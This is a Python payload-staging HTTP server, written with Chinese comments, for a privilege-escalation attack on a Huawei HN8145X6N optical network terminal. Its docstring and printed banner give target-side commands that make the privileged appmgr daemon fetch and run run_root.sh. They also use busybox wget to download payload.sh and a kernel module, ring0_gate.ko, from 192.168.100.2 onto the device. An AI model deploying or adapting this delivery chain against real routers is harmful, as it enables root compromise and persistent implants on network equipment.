#!/usr/bin/env python3
"""
Huawei ONT (HN8145X6N) Payload Delivery & Staging Server (Port 8888)
===================================================================
Author: 哈吉米
Purpose:
  在针对华为 Dopra Linux / SAF 容器框架进行特权穿透与载荷下发时，
  特权守护进程 /sbin/appmgr 支持通过 URL 参数远程拉取脚本并执行：
      "URL": "http://192.168.100.2:8888/run_root.sh"
  
  同时，宿主受限 Shell 亦可通过内置的 BusyBox wget 回传载荷：
      busybox wget http://192.168.100.2:8888/payload.sh -O /tmp/payload.sh

  本脚本在管理宿主机（PC端 192.168.100.2）上启动轻量级高并发 HTTP 服务，
  提供精准请求日志记录、CORS 跨域支持与即时下发能力。
"""

import http.server
import socketserver
import os
import sys
import time

DEFAULT_PORT = 8888
DEFAULT_BIND = "0.0.0.0"

class StagingDeliveryHandler(http.server.SimpleHTTPRequestHandler):
    """带实时时间戳与客户端 IP 追踪的文件分发处理器"""
    
    def end_headers(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        super().end_headers()

    def log_message(self, format, *args):
        client = self.client_address[0]
        ts = time.strftime("%Y-%m-%d %H:%M:%S")
        sys.stdout.write(f"[{ts}] [ONT-DELIVERY-8888] Client: {client} -> {args[0]}\n")
        sys.stdout.flush()

def start_server(port=DEFAULT_PORT, bind_ip=DEFAULT_BIND, serve_directory=None):
    if serve_directory is None:
        serve_directory = os.path.dirname(os.path.abspath(__file__))
    
    serve_directory = os.path.abspath(serve_directory)
    os.chdir(serve_directory)

    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer((bind_ip, port), StagingDeliveryHandler) as httpd:
        print("=" * 65)
        print(" [★] 华为 ONT 局域网载荷投递 HTTP 服务器 (Port 8888) 已就绪")
        print("=" * 65)
        print(f"[*] 监听网络地址 : http://{bind_ip}:{port}")
        print(f"[*] 文件根目录   : {serve_directory}")
        print("[*] 目标光猫常用抓取示例 (ONT 端执行):")
        print(f"    1) D-Bus 参数 : \"URL\": \"http://192.168.100.2:{port}/run_root.sh\"")
        print(f"    2) Wget 下载  : busybox wget http://192.168.100.2:{port}/ring0_gate.ko -O /mnt/jffs2/ring0_gate.ko")
        print("=" * 65)
        print("[*] 正在等待光猫侧请求，按 Ctrl+C 可停止服务...\n")
        
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] 服务已手动停止。")

if __name__ == "__main__":
    target_dir = sys.argv[1] if len(sys.argv) > 1 else None
    start_server(serve_directory=target_dir)
